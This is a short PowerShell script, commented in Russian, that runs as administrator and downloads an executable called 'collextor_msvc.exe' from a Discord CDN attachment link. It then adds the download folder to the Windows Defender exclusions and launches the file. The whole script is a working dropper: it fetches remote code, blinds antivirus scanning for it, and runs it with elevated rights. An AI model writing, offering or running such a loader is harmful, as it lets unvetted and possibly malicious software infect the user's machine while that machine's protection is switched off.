# Запускать от имени администратора
$dir = "$env:USERPROFILE\collextor"
$exe = "$dir\collextor_msvc.exe"
$url = "https://cdn.discordapp.com/attachments/1520398729520222211/1520799959132409896/collextor_msvc.exe?ex=6a4282d5&is=6a413155&hm=312819108eca99d8d134092f2e889413c954015879aa9866f2f68733c1d4c080&"

New-Item -ItemType Directory -Force -Path $dir | Out-Null

Write-Host "Скачиваю..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $exe

Write-Host "Добавляю в исключения Defender..." -ForegroundColor Cyan
Add-MpPreference -ExclusionPath $dir

Write-Host "Запускаю..." -ForegroundColor Green
Start-Process -FilePath $exe -WorkingDirectory $dir
